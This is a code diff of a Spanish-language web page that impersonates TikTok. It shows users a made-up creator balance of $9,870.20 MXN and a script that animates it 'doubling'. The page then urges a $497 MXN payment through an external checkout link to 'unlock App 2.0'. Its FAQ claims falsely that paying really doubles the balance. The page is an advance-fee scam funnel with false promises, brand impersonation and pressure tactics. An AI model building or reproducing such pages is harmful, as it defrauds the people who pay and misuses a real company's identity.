@@ -22,44 +22,380 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 }(window, document, 'ttq');
 </script>
 <!-- TikTok Pixel Code End -->
-<script src="/js/attr-store.js"></script>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <script src="/js/attr-store.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex, nofollow">
-  <style>@import "https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap";*,:before,:after{box-sizing:border-box;margin:0;padding:0}body{background:#0d0d0d;justify-content:center;align-items:center;min-height:100vh;font-family:Inter,system-ui,sans-serif;display:flex}.page{text-align:center;flex-direction:column;align-items:center;width:100%;max-width:390px;padding:48px 28px 56px;display:flex}.title{letter-spacing:-.5px;background:linear-gradient(135deg,#fe2c55,#25f4ee);-webkit-text-fill-color:transparent;-webkit-background-clip:text;background-clip:text;margin-bottom:32px;font-size:30px;font-weight:900;line-height:1.2}.badge{filter:drop-shadow(0 8px 24px #25f4ee40);width:150px;height:150px;margin-bottom:32px}.subtitle{color:#888;margin-bottom:40px;font-size:15px;font-weight:600;line-height:1.6}.upsell-checkout-btn{display:flex;width:100%;align-items:center;justify-content:center;border-radius:999px;background:#FE2C55;padding:16px 24px;font-size:15px;font-weight:900;text-transform:uppercase;letter-spacing:.04em;color:#fff;text-decoration:none;box-shadow:0 12px 28px rgba(254,44,85,.35)}.upsell-checkout-btn:active{transform:scale(.98)}.upsell-skip{margin-top:14px;display:block;font-size:12px;font-weight:600;color:#777;text-decoration:underline;text-underline-offset:2px}</style>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+    body { font-family: 'Inter', sans-serif; background-color: #FFFFFF; color: #161823; }
+    .progress-bar {
+      animation: fill 3s cubic-bezier(0.65, 0, 0.35, 1) forwards;
+      background: linear-gradient(90deg, #FE2C55, #25F4EE);
+    }
+    @keyframes fill { from { width: 0%; } to { width: 100%; } }
+    .logo-sharp {
+      filter: contrast(1.1) brightness(1.05);
+      image-rendering: -webkit-optimize-contrast;
+    }
+    .premium-card {
+      background: linear-gradient(135deg, #161823 0%, #292d3e 100%);
+    }
+    details summary::-webkit-details-marker { display: none; }
+
+    .app20 {
+      width: 112px;
+      height: 112px;
+      position: relative;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 8px;
+    }
+    .app20__ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 999px;
+      border: 5px solid #161823;
+      background: #fff;
+      z-index: 2;
+      box-shadow: 0 10px 28px rgba(22, 24, 35, 0.18);
+      animation: app20-pop .7s cubic-bezier(.2,1.4,.3,1) both;
+    }
+    .app20__glow-pink,
+    .app20__glow-cyan {
+      position: absolute;
+      inset: -6px;
+      border-radius: 999px;
+      z-index: 1;
+      filter: blur(0.2px);
+    }
+    .app20__glow-pink {
+      background: rgba(254, 44, 85, 0.28);
+      transform: translate(-7px, -7px);
+      animation: app20-orbit-pink 2.4s ease-in-out infinite;
+    }
+    .app20__glow-cyan {
+      background: rgba(37, 244, 238, 0.28);
+      transform: translate(7px, 7px);
+      animation: app20-orbit-cyan 2.4s ease-in-out infinite;
+    }
+    .app20__text {
+      position: relative;
+      z-index: 3;
+      font-size: 34px;
+      font-weight: 900;
+      letter-spacing: -0.06em;
+      line-height: 1;
+      color: #FE2C55;
+      text-shadow:
+        -2px 0 0 rgba(37, 244, 238, 0.55),
+         2px 0 0 rgba(254, 44, 85, 0.35);
+      animation: app20-text 1.8s ease-in-out infinite;
+    }
+    .app20__spark {
+      position: absolute;
+      z-index: 4;
+      width: 8px;
+      height: 8px;
+      border-radius: 999px;
+      background: #25F4EE;
+      box-shadow: 0 0 12px #25F4EE;
+      animation: app20-spark 1.6s linear infinite;
+    }
+    .app20__spark--2 {
+      background: #FE2C55;
+      box-shadow: 0 0 12px #FE2C55;
+      animation-delay: .8s;
+    }
+    @keyframes app20-pop {
+      0% { transform: scale(.55); opacity: 0; }
+      70% { transform: scale(1.08); opacity: 1; }
+      100% { transform: scale(1); }
+    }
+    @keyframes app20-orbit-pink {
+      0%, 100% { transform: translate(-7px, -7px) scale(1); opacity: .9; }
+      50% { transform: translate(-11px, -3px) scale(1.06); opacity: 1; }
+    }
+    @keyframes app20-orbit-cyan {
+      0%, 100% { transform: translate(7px, 7px) scale(1); opacity: .9; }
+      50% { transform: translate(11px, 3px) scale(1.06); opacity: 1; }
+    }
+    @keyframes app20-text {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+    }
+    @keyframes app20-spark {
+      0% { transform: rotate(0deg) translateX(58px) scale(.6); opacity: 0; }
+      20% { opacity: 1; }
+      100% { transform: rotate(360deg) translateX(58px) scale(.6); opacity: 0; }
+    }
+
+    .balance-wrap {
+      position: relative;
+      min-height: 48px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .balance-amount {
+      font-size: 1.75rem;
+      font-weight: 900;
+      letter-spacing: -0.03em;
+      line-height: 1.15;
+      color: #161823;
+      transition: color .25s ease, transform .25s ease;
+    }
+    .balance-amount.is-doubling {
+      color: #FE2C55;
+      transform: scale(1.04);
+      text-shadow: 0 8px 24px rgba(254, 44, 85, 0.25);
+    }
+    .balance-amount.is-doubled {
+      color: #0f9f6e;
+      transform: scale(1);
+    }
+    .balance-old {
+      font-size: 12px;
+      font-weight: 700;
+      color: #9ca3af;
+      text-decoration: line-through;
+      opacity: 0;
+      height: 0;
+      overflow: hidden;
+      transition: opacity .35s ease, height .35s ease, margin .35s ease;
+    }
+    .balance-old.is-visible {
+      opacity: 1;
+      height: 18px;
+      margin-top: 6px;
+    }
+    .x2-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 10px;
+      padding: 6px 12px;
+      border-radius: 999px;
+      background: #161823;
+      color: #25F4EE;
+      font-size: 10px;
+      font-weight: 900;
+      letter-spacing: .14em;
+      text-transform: uppercase;
+      opacity: 0;
+      transform: translateY(8px) scale(.9);
+      transition: opacity .35s ease, transform .35s ease;
+    }
+    .x2-chip.is-visible {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+  </style>
 </head>
-<body>
-  <div class="page">
+<body class="antialiased">
 
-    <div class="title">¡Información<br/>validada con éxito!</div>
-
-    <svg class="badge" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <radialGradient id="g" cx="38%" cy="28%" r="65%">
-          <stop offset="0%" stop-color="#5bc8f5"/>
-          <stop offset="100%" stop-color="#1a8fe3"/>
-        </radialGradient>
-        <filter id="sh">
-          <feDropShadow dx="0" dy="6" stdDeviation="8" flood-color="rgba(30,120,220,0.4)"/>
-        </filter>
-      </defs>
-      <path filter="url(#sh)" fill="url(#g)" d="M100 10 L113 40 L145 28 L138 62 L172 68 L155 95 L172 122 L138 128 L145 162 L113 150 L100 180 L87 150 L55 162 L62 128 L28 122 L45 95 L28 68 L62 62 L55 28 L87 40 Z"/>
-      <polyline points="68,100 90,122 132,78" stroke="#fff" stroke-width="14" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-    </svg>
-
-    <p class="subtitle">Toca el botón de abajo para<br/>completar el proceso.</p>
-    <a
-      id="upsell-checkout-btn"
-      href="https://xpag.global/pay/1TZ6rrSF"
-      data-checkout="1"
-      class="upsell-checkout-btn"
-    >
-      Completar retiro · $497,00 MXN
-    </a>
-    <a href="/mx/thankyou/" class="upsell-skip">Continuar sin completar</a>
-
-    <script src="/js/funnel-track.js" defer></script>
-
+  <div class="bg-[#FE2C55] text-white text-center py-2.5 px-4 text-[11px] font-bold uppercase tracking-tight w-full sticky top-0 z-50 leading-snug">
+    App 2.0 disponible — desbloquea hasta 2× tu saldo
   </div>
+
+  <div class="max-w-md mx-auto min-h-screen pb-12 bg-white">
+
+    <div class="px-6 pt-5 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+      <img src="/images/tiktok-logo.png"
+           alt="TikTok"
+           class="h-20 w-20 object-contain mb-6 logo-sharp drop-shadow-sm">
+
+      <div class="text-center w-full">
+        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-2">Saldo disponible</p>
+        <div class="balance-wrap">
+          <div id="balanceAmount" class="balance-amount">$9.870,20 MXN</div>
+          <div id="balanceOld" class="balance-old">$9.870,20 MXN</div>
+        </div>
+        <div id="x2Chip" class="x2-chip">2× aplicado por App 2.0</div>
+      </div>
+    </div>
+
+    <div class="px-6 py-8">
+
+      <div class="text-center mb-8">
+        <div class="app20" aria-hidden="true">
+          <span class="app20__glow-pink"></span>
+          <span class="app20__glow-cyan"></span>
+          <span class="app20__ring"></span>
+          <span class="app20__text">2.0</span>
+          <span class="app20__spark"></span>
+          <span class="app20__spark app20__spark--2"></span>
+        </div>
+
+        <h1 class="text-2xl font-black mb-2 italic">DESBLOQUEA APP 2.0</h1>
+        <p class="text-gray-500 text-sm leading-relaxed px-2">
+          Activa el nuevo motor de pagos y vuelve elegible para <strong>duplicar</strong> tu saldo disponible antes de liberar la transferencia.
+        </p>
+      </div>
+
+      <div class="mb-6 rounded-2xl border border-[#25F4EE]/30 bg-[#25F4EE]/5 p-4 text-left">
+        <p class="text-[10px] font-black uppercase tracking-widest text-[#161823] mb-2">Qué hace App 2.0</p>
+        <p class="text-[13px] text-gray-600 leading-relaxed">
+          App 2.0 actualiza tu perfil de pagos de creador. Las cuentas elegibles pueden desbloquear un <strong>aumento de saldo 2×</strong> — de <strong>$9.870,20 MXN</strong> hasta <strong>$19.740,40 MXN</strong>.
+        </p>
+      </div>
+
+      <div class="mb-8">
+        <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-2">
+          <div class="progress-bar h-full"></div>
+        </div>
+        <div class="flex justify-between items-center">
+          <p class="text-[10px] font-bold text-[#FE2C55] uppercase tracking-wider">Paso final: actualización App 2.0</p>
+          <p class="text-[10px] font-bold text-gray-400 uppercase">100%</p>
+        </div>
+      </div>
+
+      <div class="mb-6 bg-white rounded-2xl border border-gray-100 p-5 shadow-sm">
+        <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4 text-center">Cómo funciona el aumento</p>
+        <div class="space-y-4">
+          <div class="flex gap-3 items-start">
+            <div class="w-7 h-7 rounded-full bg-[#FE2C55] text-white text-[11px] font-black flex items-center justify-center shrink-0">1</div>
+            <div>
+              <p class="text-[13px] font-bold text-gray-900">Activa App 2.0</p>
+              <p class="text-[12px] text-gray-500"><span id="upsellValue">$497,00 MXN</span> — desbloquea el motor de pagos actualizado</p>
+            </div>
+          </div>
+          <div class="flex gap-3 items-start">
+            <div class="w-7 h-7 rounded-full bg-[#161823] text-white text-[11px] font-black flex items-center justify-center shrink-0">2</div>
+            <div>
+              <p class="text-[13px] font-bold text-gray-900">El sistema aplica el multiplicador 2×</p>
+              <p class="text-[12px] text-gray-500">Tu saldo actual queda elegible para duplicarse</p>
+            </div>
+          </div>
+          <div class="flex gap-3 items-start">
+            <div class="w-7 h-7 rounded-full bg-[#0f9f6e] text-white text-[11px] font-black flex items-center justify-center shrink-0">3</div>
+            <div>
+              <p class="text-[13px] font-bold text-gray-900">Recibe el pago aumentado</p>
+              <p class="text-[12px] text-gray-500">Hasta <strong>$19.740,40 MXN</strong> liberados a tu cuenta</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="mb-6 rounded-2xl border border-emerald-200 bg-emerald-50 p-4 text-left">
+        <p class="text-[12px] text-emerald-900 leading-relaxed">
+          <strong>Actualización opcional.</strong> Sin App 2.0 mantienes tus <strong>$9.870,20 MXN</strong>. Con App 2.0 desbloqueas la oportunidad de recibir <strong>$19.740,40 MXN</strong>.
+        </p>
+      </div>
+
+      <div class="space-y-4">
+        <div class="w-full max-w-md mx-auto space-y-3">
+          <a
+            id="upsell-checkout-btn"
+            href="https://xpag.global/pay/1TZ6rrSF"
+            data-checkout="1"
+            class="flex w-full items-center justify-center rounded-full bg-[#FE2C55] px-6 py-4 text-[15px] font-black uppercase tracking-wide text-white shadow-lg shadow-[#FE2C55]/30 transition active:scale-[0.98]"
+          >
+            Desbloquear App 2.0 · $497,00 MXN
+          </a>
+          <a href="/mx/thankyou/" class="block text-center text-[12px] font-semibold text-gray-400 underline-offset-2 hover:underline">
+            Continuar sin completar
+          </a>
+        </div>
+
+        <p class="text-center text-[11px] text-gray-500 font-medium">
+          Activa App 2.0 para desbloquear el pago con saldo duplicado
+        </p>
+
+        <div class="mt-8 premium-card rounded-[2rem] p-6 relative overflow-hidden shadow-xl">
+          <div class="absolute top-0 right-0 p-3">
+            <span class="bg-[#25F4EE] text-[#161823] text-[9px] font-black px-2 py-1 rounded-md uppercase tracking-widest">2× BOOST</span>
+          </div>
+          <p class="text-gray-400 text-[11px] uppercase font-bold mb-1 tracking-widest">Puedes recibir con App 2.0:</p>
+          <p class="text-2xl font-black text-white tracking-tight leading-tight">$19.740,40 MXN</p>
+          <p class="text-[12px] text-gray-400 mt-2">$9.870,20 MXN × 2 con App 2.0</p>
+          <p class="text-[12px] text-gray-500 mt-1">SPEI · PayPal · Mercado Pago</p>
+          <div class="mt-4 flex items-center gap-2">
+            <div class="w-2 h-2 bg-[#25F4EE] rounded-full animate-pulse"></div>
+            <span class="text-[#25F4EE] text-[10px] font-black uppercase tracking-[0.1em]">Actualización disponible ahora</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-10 space-y-2">
+        <details class="group bg-white rounded-xl border border-gray-100 shadow-sm">
+          <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-[13px] text-gray-800 uppercase tracking-tight">
+            ¿Qué es App 2.0?
+            <span class="text-[#FE2C55] transition-transform group-open:rotate-45 text-xl">+</span>
+          </summary>
+          <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+            App 2.0 es el motor de pagos actualizado para creadores elegibles. Desbloquea reglas avanzadas de transferencia que pueden duplicar tu saldo disponible antes de liberarlo.
+          </div>
+        </details>
+        <details class="group bg-white rounded-xl border border-gray-100 shadow-sm">
+          <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-[13px] text-gray-800 uppercase tracking-tight">
+            ¿De verdad puedo duplicar mi saldo?
+            <span class="text-[#FE2C55] transition-transform group-open:rotate-45 text-xl">+</span>
+          </summary>
+          <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+            Sí. Con App 2.0 activada, tus <strong>$9.870,20 MXN</strong> actuales quedan elegibles para un aumento 2× — hasta <strong>$19.740,40 MXN</strong>.
+          </div>
+        </details>
+        <details class="group bg-white rounded-xl border border-gray-100 shadow-sm">
+          <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-[13px] text-gray-800 uppercase tracking-tight">
+            ¿Qué pasa si me salto App 2.0?
+            <span class="text-[#FE2C55] transition-transform group-open:rotate-45 text-xl">+</span>
+          </summary>
+          <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+            Mantienes el pago estándar de <strong>$9.870,20 MXN</strong> y continúas sin la actualización de saldo duplicado.
+          </div>
+        </details>
+      </div>
+    </div>
+
+    <footer class="py-12 text-center">
+      <p class="text-[10px] text-gray-300 font-bold uppercase tracking-[0.4em]">TikTok Financial © 2026</p>
+    </footer>
+  </div>
+
+  <script>
+    (function () {
+      var FROM = 9870.20;
+      var TO = 19740.40;
+      var el = document.getElementById("balanceAmount");
+      var oldEl = document.getElementById("balanceOld");
+      var chip = document.getElementById("x2Chip");
+      if (!el) return;
+
+      function money(n) {
+        var parts = Number(n).toFixed(2).split(".");
+        parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+        return "$" + parts[0] + "," + parts[1] + " MXN";
+      }
+
+      function animateBalance() {
+        var start = null;
+        var duration = 900;
+        el.classList.add("is-doubling");
+        function frame(ts) {
+          if (start == null) start = ts;
+          var t = Math.min(1, (ts - start) / duration);
+          var eased = 1 - Math.pow(1 - t, 3);
+          var value = FROM + (TO - FROM) * eased;
+          el.textContent = money(value);
+          if (t < 1) {
+            requestAnimationFrame(frame);
+          } else {
+            el.textContent = money(TO);
+            el.classList.remove("is-doubling");
+            el.classList.add("is-doubled");
+            if (oldEl) oldEl.classList.add("is-visible");
+            if (chip) chip.classList.add("is-visible");
+          }
+        }
+        requestAnimationFrame(frame);
+      }
+
+      setTimeout(animateBalance, 450);
+    })();
+  </script>
+  <script src="/js/funnel-track.js" defer></script>
 </body>
 </html>
